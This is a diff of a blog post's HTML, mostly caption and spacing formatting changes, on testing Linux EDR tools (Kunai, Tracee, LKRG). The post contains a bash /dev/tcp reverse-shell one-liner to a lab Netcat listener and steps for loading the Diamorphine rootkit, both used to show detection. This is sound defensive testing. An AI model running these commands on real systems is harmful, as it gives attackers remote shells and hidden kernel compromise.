@@ -46,7 +46,7 @@
   <meta itemprop="description" content="An exploration of open‑source Linux EDRs and the kernel‑level signals that power modern threat hunting.">
   <meta itemprop="datePublished" content="2026-01-12T08:24:15+08:00">
   <meta itemprop="dateModified" content="2026-01-12T08:24:15+08:00">
-  <meta itemprop="wordCount" content="2032">
+  <meta itemprop="wordCount" content="2035">
   <meta itemprop="image" content="https://mathscantor.github.io/posts/linux-edr-for-host-events/images/cover.png">
   <meta itemprop="keywords" content="EDR">
 
@@ -239,7 +239,7 @@
           <i class="fa-solid fa-clock"></i>
           10 Minutes
           <i class="fa-solid fa-clipboard"></i>
-          2032 Words
+          2035 Words
           
         </p>
         <p>
@@ -325,17 +325,41 @@
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Assuming you have rustup and cargo installed</span>
 </span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ cargo install bpf-linker
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Installing <em>Kunai</em> Dependencies<br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Installing <em>Kunai</em> Dependencies
+  
+    <br><br>
+  
+</span>
 <p><u>Step 2: Build <em>Kunai</em> from source</u></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ git clone https://github.com/kunai-project/kunai.git
 </span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ cd kunai
 </span></span><span style="display:flex;"><span>gerald@ubuntu2404:~/kunai$ cargo xtask build --release
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Building <em>Kunai</em><br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Building <em>Kunai</em>
+  
+    <br><br>
+  
+</span>
 <p><u>Step 3: Install <em>Kunai</em></u></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~/kunai$ sudo target/x86_64-unknown-linux-gnu/release/kunai install
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Installing <em>Kunai</em><br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Installing <em>Kunai</em>
+  
+    <br><br>
+  
+</span>
 <p><u>Step 4: Configure <em>Kunai</em> Event Detection</u></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo vim /etc/kunai/config.yaml
 </span></span><span style="display:flex;"><span>...
@@ -346,7 +370,15 @@
 </span></span><span style="display:flex;"><span>    enable: true
 </span></span><span style="display:flex;"><span>...
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Modify <em>Kunai</em> Configuration<br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Modify <em>Kunai</em> Configuration
+  
+    <br><br>
+  
+</span>
 <h3 id="22-capabilities-overview">2.2 Capabilities Overview</h3>
 <p>The capabilities of <em>Kunai</em> are summarized in the following table:</p>
 <table>
@@ -530,15 +562,31 @@
   </tbody>
 </table>
 <link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="table"><em>Kunai</em> Capability Coverage<br><br></span>
+
+
+
+<span class="caption" data-type="table">
+  <em>Kunai</em> Capability Coverage
+  
+    <br><br>
+  
+</span>
 <h3 id="23-testing-capabilities">2.3 Testing Capabilities</h3>
 <p>Is Kunai really as good as its documentation describes it to be? Let&rsquo;s find out!</p>
 <h4 id="231-dns-query">2.3.1 DNS Query</h4>
-<p>This example demonstrates a simple DNS query to resolve the IP address for <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;google.com&ensp;</span>.</p>
+<p>This example demonstrates a simple DNS query to resolve the IP address for <span style="font-family: Courier, monospace; font-weight: 600;">google.com</span>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ nslookup google.com
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">DNS Query Example Command<br><br></span>
-<p>As seen from the listing below, <em>Kunai</em> captures a <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;dns_query&ensp;</span> event corresponding to a domain resolution request for <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;google.com&ensp;</span>. The event records the process responsible for the lookup (<span style="font-family: Courier, monospace; font-weight: 600;">&ensp;systemd-resolved&ensp;</span>), its execution context, and the full set of IP addresses returned in the DNS response.</p>
+
+
+
+<span class="caption" data-type="listing">
+  DNS Query Example Command
+  
+    <br><br>
+  
+</span>
+<p>As seen from the listing below, <em>Kunai</em> captures a <span style="font-family: Courier, monospace; font-weight: 600;">dns_query</span> event corresponding to a domain resolution request for <span style="font-family: Courier, monospace; font-weight: 600;">google.com</span>. The event records the process responsible for the lookup (<span style="font-family: Courier, monospace; font-weight: 600;">systemd-resolved</span>), its execution context, and the full set of IP addresses returned in the DNS response.</p>
 <p>By preserving both the queried domain and the resolved endpoints, <em>Kunai</em> provides visibility into name resolution activity that often precedes outbound connections.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;data&#34;</span>: {
@@ -566,13 +614,29 @@
 </span></span><span style="display:flex;"><span>  }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">DNS Query Example Output<br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  DNS Query Example Output
+  
+    <br><br>
+  
+</span>
 <h4 id="232-process-debugging">2.3.2 Process Debugging</h4>
-<p>This example demonstrates a debugger attaching to a running process using the <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;ptrace()&ensp;</span> syscall. Debugger attachment is a high-signal event, often associated with reverse engineering, process inspection, or malicious code injection.</p>
+<p>This example demonstrates a debugger attaching to a running process using the <span style="font-family: Courier, monospace; font-weight: 600;">ptrace()</span> syscall. Debugger attachment is a high-signal event, often associated with reverse engineering, process inspection, or malicious code injection.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo gdb -p <span style="color:#e6db74">`</span>pidof sleep<span style="color:#e6db74">`</span>
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Process Debugging Example Command<br><br></span>
-<p>Kunai captures a <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;ptrace&ensp;</span> event where <em>GDB</em> attaches to an existing <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;sleep&ensp;</span> process. The event records the full process ancestry leading up to the debugger invocation, the exact command used (<code>gdb -p 6967</code>), and both the source executable (<span style="font-family: Courier, monospace; font-weight: 600;">&ensp;/usr/bin/gdb&ensp;</span>) and the target process being traced (<span style="font-family: Courier, monospace; font-weight: 600;">&ensp;/usr/bin/sleep&ensp;</span>).</p>
+
+
+
+<span class="caption" data-type="listing">
+  Process Debugging Example Command
+  
+    <br><br>
+  
+</span>
+<p>Kunai captures a <span style="font-family: Courier, monospace; font-weight: 600;">ptrace</span> event where <em>GDB</em> attaches to an existing <span style="font-family: Courier, monospace; font-weight: 600;">sleep</span> process. The event records the full process ancestry leading up to the debugger invocation, the exact command used (<code>gdb -p 6967</code>), and both the source executable (<span style="font-family: Courier, monospace; font-weight: 600;">/usr/bin/gdb</span>) and the target process being traced (<span style="font-family: Courier, monospace; font-weight: 600;">/usr/bin/sleep</span>).</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;data&#34;</span>: {
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;ancestors&#34;</span>: <span style="color:#e6db74">&#34;/usr/lib/systemd/systemd|/usr/lib/systemd/systemd|/usr/bin/python3.12|/usr/bin/bash|/usr/bin/sudo|/usr/bin/sudo&#34;</span>,
@@ -603,13 +667,29 @@
 </span></span><span style="display:flex;"><span>  }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Process Debugging Example Output<br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Process Debugging Example Output
+  
+    <br><br>
+  
+</span>
 <h4 id="233-reverse-shell">2.3.3 Reverse Shell</h4>
-<p>This example demonstrates a simple reverse shell payload that connects out to our <em>Netcat</em> listener at <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;172.16.205.1:4242.&ensp;</span></p>
+<p>This example demonstrates a simple reverse shell payload that connects out to our <em>Netcat</em> listener at <span style="font-family: Courier, monospace; font-weight: 600;">172.16.205.1:4242.</span></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ /bin/bash -l &gt; /dev/tcp/172.16.205.1/4242 0&lt;&amp;<span style="color:#ae81ff">1</span> 2&gt;&amp;<span style="color:#ae81ff">1</span>
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Reverse Shell Example Command<br><br></span>
-<p>As shown in the listing below, <em>Kunai</em> captures a connect event initiated by <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;/bin/bash&ensp;</span>, revealing an outbound TCP connection to the <em>Netcat</em> listener at <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;172.16.205.1:4242.&ensp;</span> The event records the full process ancestry leading to the shell execution, the executable responsible for the connection, and detailed socket metadata, including protocol, source port, and destination address.</p>
+
+
+
+<span class="caption" data-type="listing">
+  Reverse Shell Example Command
+  
+    <br><br>
+  
+</span>
+<p>As shown in the listing below, <em>Kunai</em> captures a connect event initiated by <span style="font-family: Courier, monospace; font-weight: 600;">/bin/bash</span>, revealing an outbound TCP connection to the <em>Netcat</em> listener at <span style="font-family: Courier, monospace; font-weight: 600;">172.16.205.1:4242.</span> The event records the full process ancestry leading to the shell execution, the executable responsible for the connection, and detailed socket metadata, including protocol, source port, and destination address.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;data&#34;</span>: {
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;ancestors&#34;</span>: <span style="color:#e6db74">&#34;/usr/lib/systemd/systemd|/usr/lib/systemd/systemd|/usr/bin/python3.12|/usr/bin/bash&#34;</span>,
@@ -650,7 +730,15 @@
 </span></span><span style="display:flex;"><span>  }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Reverse Shell Example Output<br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Reverse Shell Example Output
+  
+    <br><br>
+  
+</span>
 <h2 id="3-tracee">3. Tracee</h2>
 <p><em>Tracee</em> is a Linux runtime security tool that uses eBPF to capture syscalls and process behavior in real time. Unlike <em>Kunai’s</em> enriched EDR approach, <em>Tracee</em> gives raw and low-level events, perfect for forensics, adversary simulations, and understanding exactly how attacks unfold.</p>
 <h3 id="31-installation">3.1 Installation</h3>
@@ -658,22 +746,54 @@
 <p><u>Step 1: Installing dependencies</u></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo apt-get install golang-go build-essential linux-headers-<span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span> clang libelf1 libelf-dev zlib1g-dev libbpf-dev
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Installing <em>Tracee</em> Dependencies<br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Installing <em>Tracee</em> Dependencies
+  
+    <br><br>
+  
+</span>
 <p><u>Step 2: Build <em>Tracee</em> from Source</u></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ git clone https://github.com/aquasecurity/tracee.git
 </span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ cd tracee
 </span></span><span style="display:flex;"><span>gerald@ubuntu2404:~/tracee$ make
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Building <em>Tracee</em><br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Building <em>Tracee</em>
+  
+    <br><br>
+  
+</span>
 <p><u>Step 3: Install <em>Tracee</em></u></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~/tracee$ sudo cp ./dist/tracee /usr/bin/
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Installing <em>Tracee</em><br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Installing <em>Tracee</em>
+  
+    <br><br>
+  
+</span>
 <h3 id="32-capabilities-overview">3.2 Capabilities Overview</h3>
 <p>The list of monitored events is extensive, so I’ll point you to the command that lets you inspect <em>Tracee’s</em> capabilities yourself.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ tracee list events
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Showing Supported <em>Tracee</em> Events<br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Showing Supported <em>Tracee</em> Events
+  
+    <br><br>
+  
+</span>
 <h3 id="33-testing-capabilities">3.3 Testing Capabilities</h3>
 <p>To test out the true capabilities of <em>Tracee</em>, we assume that our machine has already been compromised. Using <a href="https://github.com/m0nad/Diamorphine.git"><em>Diamorphine</em></a> as our example LKM rootkit, we shall first insert the module, before running <em>Tracee</em>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ git clone https://github.com/m0nad/Diamorphine.git
@@ -681,29 +801,69 @@
 </span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ make
 </span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo insmod diamorphine.ko
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Inserting <em>Diamorphine</em> LKM Rootkit<br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Inserting <em>Diamorphine</em> LKM Rootkit
+  
+    <br><br>
+  
+</span>
 <h4 id="331-hidden-kernel-module">3.3.1 Hidden Kernel Module</h4>
-<p>This command in the listing below instructs <em>Tracee</em> to subscribe specifically to the <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;hidden_kernel_module&ensp;</span> event, which detects kernel modules that are present in memory but intentionally omitted from standard kernel data structures such as /proc/modules. This is a common stealth technique used by Linux kernel rootkits to evade user-space inspection tools.</p>
+<p>This command in the listing below instructs <em>Tracee</em> to subscribe specifically to the <span style="font-family: Courier, monospace; font-weight: 600;">hidden_kernel_module</span> event, which detects kernel modules that are present in memory but intentionally omitted from standard kernel data structures such as /proc/modules. This is a common stealth technique used by Linux kernel rootkits to evade user-space inspection tools.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo tracee -e hidden_kernel_module
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing"><em>Tracee</em> - Filter For<span style="font-family: Courier, monospace; font-weight: 600;"> hidden_kernel_module </span>Events<br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  <em>Tracee</em> - Filter For <span style="font-family: Courier, monospace; font-weight: 600;">hidden_kernel_module</span> Events
+  
+    <br><br>
+  
+</span>
 <p>The output shows <em>Tracee</em> successfully identifying a kernel module that is not visible through normal enumeration methods. In this case, the hidden module is <em>Diamorphine</em>, along with its kernel memory address and source version hash, providing strong attribution that a stealthy LKM is active on the system.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">TIME</span>             <span style="color:#a6e22e">UID</span>    <span style="color:#a6e22e">COMM</span>             <span style="color:#a6e22e">PID</span>     <span style="color:#a6e22e">TID</span>     <span style="color:#a6e22e">EVENT</span>                     <span style="color:#a6e22e">ARGS</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">28</span><span style="color:#f92672">:</span><span style="color:#ae81ff">32</span><span style="color:#f92672">:</span><span style="color:#ae81ff">516401</span>                          <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>       <span style="color:#a6e22e">hidden_kernel_module</span>      <span style="color:#a6e22e">address</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0xffffffffc0ad1140</span>, <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">diamorphine</span>, <span style="color:#a6e22e">srcversion</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">39</span><span style="color:#a6e22e">C9AFE44143084E37251EA</span>
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Detecting Hidden <em>Diamorphine</em> LKM<br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Detecting Hidden <em>Diamorphine</em> LKM
+  
+    <br><br>
+  
+</span>
 <h4 id="332-syscall-hooking">3.3.2 Syscall Hooking</h4>
-<p>This command enables <em>Tracee’s</em> <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;syscall_hooking&ensp;</span> detection, which monitors the system call table for unauthorized modifications. Kernel rootkits frequently hook syscalls to hide processes, files, or escalate privileges—making syscall integrity a high-value detection signal.</p>
+<p>This command enables <em>Tracee’s</em> <span style="font-family: Courier, monospace; font-weight: 600;">syscall_hooking</span> detection, which monitors the system call table for unauthorized modifications. Kernel rootkits frequently hook syscalls to hide processes, files, or escalate privileges—making syscall integrity a high-value detection signal.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo tracee -e syscall_hooking
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing"><em>Tracee</em> - Filter For<span style="font-family: Courier, monospace; font-weight: 600;"> syscall_hooking </span>Events<br><br></span>
-<p>Tracee reports three syscall hooking events, corresponding to the syscalls modified by <em>Diamorphine</em>: <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;kill(),&ensp;</span><span style="font-family: Courier, monospace; font-weight: 600;">&ensp;getdents()&ensp;</span>and<span style="font-family: Courier, monospace; font-weight: 600;">&ensp;getdents64()&ensp;</span>. These hooks are used to hide processes, conceal files and directories, and provide a covert control channel via signals.</p>
+
+
+
+<span class="caption" data-type="listing">
+  <em>Tracee</em> - Filter For <span style="font-family: Courier, monospace; font-weight: 600;">syscall_hooking</span> Events
+  
+    <br><br>
+  
+</span>
+<p>Tracee reports three syscall hooking events, corresponding to the syscalls modified by <em>Diamorphine</em>: <span style="font-family: Courier, monospace; font-weight: 600;">kill()</span>, <span style="font-family: Courier, monospace; font-weight: 600;">getdents()</span> and <span style="font-family: Courier, monospace; font-weight: 600;">getdents64()</span>. These hooks are used to hide processes, conceal files and directories, and provide a covert control channel via signals.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">TIME</span>             <span style="color:#a6e22e">UID</span>    <span style="color:#a6e22e">COMM</span>             <span style="color:#a6e22e">PID</span>     <span style="color:#a6e22e">TID</span>     <span style="color:#a6e22e">EVENT</span>                     <span style="color:#a6e22e">ARGS</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">39</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#ae81ff">447226</span>                          <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>       <span style="color:#a6e22e">syscall_hooking</span>           
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">39</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#ae81ff">447226</span>                          <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>       <span style="color:#a6e22e">syscall_hooking</span>           
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">39</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#ae81ff">447226</span>                          <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>       <span style="color:#a6e22e">syscall_hooking</span>
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Detecting Syscall Hooking<br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Detecting Syscall Hooking
+  
+    <br><br>
+  
+</span>
 <h2 id="4-lkrg">4. LKRG</h2>
 <p>LKRG performs runtime integrity checking of the Linux kernel and detection of
 security vulnerability exploits against the kernel.</p>
@@ -711,20 +871,36 @@ security vulnerability exploits against the kernel.</p>
 on top of a wide range of mainline and distros&rsquo; kernels, without needing to
 patch those.  We currently support kernel versions ranging from as far back as
 RHEL7&rsquo;s (and its many clones/revisions) to latest mainline and distros kernels.</p>
-<p>LKRG 1.0.0 has been tested with Linux kernels from RHEL/CentOS 7&rsquo;s <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;3.10.0-1160&ensp;</span> and up to Fedora&rsquo;s build of <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;6.17.0-0.rc4.36.fc44.x86_64&ensp;</span>.</p>
+<p>LKRG 1.0.0 has been tested with Linux kernels from RHEL/CentOS 7&rsquo;s <span style="font-family: Courier, monospace; font-weight: 600;">3.10.0-1160</span> and up to Fedora&rsquo;s build of <span style="font-family: Courier, monospace; font-weight: 600;">6.17.0-0.rc4.36.fc44.x86_64</span>.</p>
 <p>LKRG currently supports the x86-64, 32-bit x86, AArch64 (ARM64), and 32-bit ARM
 CPU architectures.</p>
 <h3 id="41-installation">4.1 Installation</h3>
 <p><u>Step 1: Installing dependencies</u></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo apt-get install make gcc gawk libelf-dev linux-headers-<span style="color:#66d9ef">$(</span>uname -r<span style="color:#66d9ef">)</span>
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Installing <em>LKRG</em> Dependencies<br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Installing <em>LKRG</em> Dependencies
+  
+    <br><br>
+  
+</span>
 <p><u>Step 2: Build From Source</u></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ git clone https://github.com/lkrg-org/lkrg.git
 </span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ cd lkrg
 </span></span><span style="display:flex;"><span>gerald@ubuntu2404:~/lkrg$ make -j8
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Building <em>LKRG</em> from Source<br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Building <em>LKRG</em> from Source
+  
+    <br><br>
+  
+</span>
 <p><u>Step 3: Testing LKM</u></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Insert LKM</span>
 </span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo insmod lkrg.ko kint_enforce<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
@@ -735,13 +911,29 @@ CPU architectures.</p>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Remove LKM</span>
 </span></span><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo rmmod lkrg
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Testing <em>LKRG</em><br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Testing <em>LKRG</em>
+  
+    <br><br>
+  
+</span>
 <p><u>Step 4: Install <em>LKRG</em> to Start On Boot</u></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~/lkrg$ make install
 </span></span><span style="display:flex;"><span>gerald@ubuntu2404:~/lkrg$ sudo systemctl enable lkrg
 </span></span><span style="display:flex;"><span>gerald@ubuntu2404:~/lkrg$ sudo systemctl start lkrg
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Installing <em>LKRG</em><br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Installing <em>LKRG</em>
+  
+    <br><br>
+  
+</span>
 <h3 id="42-capabilities-overview">4.2 Capabilities Overview</h3>
 <p>According to the <a href="https://lkrg.org/">official site</a>:</p>
 <blockquote>
@@ -751,22 +943,54 @@ CPU architectures.</p>
 <p>To validate <em>LKRG’s</em> post-detection claims, we first disable the <em>LKRG</em> kernel module to simulate an unprotected system state before introducing a stealthy kernel rootkit.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo systemctl stop lkrg
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Stop <em>LKRG</em> Service<br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Stop <em>LKRG</em> Service
+  
+    <br><br>
+  
+</span>
 <p>With <em>LKRG</em> inactive, we load the <em>Diamorphine</em> LKM, which employs multiple stealth techniques to hide its presence from standard kernel visibility mechanisms.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo insmod ~/Diamorphine/diamorphine.ko
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Load <em>Diamorphine</em> Rootkit<br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Load <em>Diamorphine</em> Rootkit
+  
+    <br><br>
+  
+</span>
 <p>Once the malicious module is resident in memory, <em>LKRG</em> is re-enabled to assess whether it can retrospectively detect kernel integrity violations introduced while it was offline.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gerald@ubuntu2404:~$ sudo systemctl start lkrg
 </span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-<span class="caption" data-type="listing">Start <em>LKRG</em> Service<br><br></span>
+
+
+
+<span class="caption" data-type="listing">
+  Start <em>LKRG</em> Service
+  
+    <br><br>
+  
+</span>
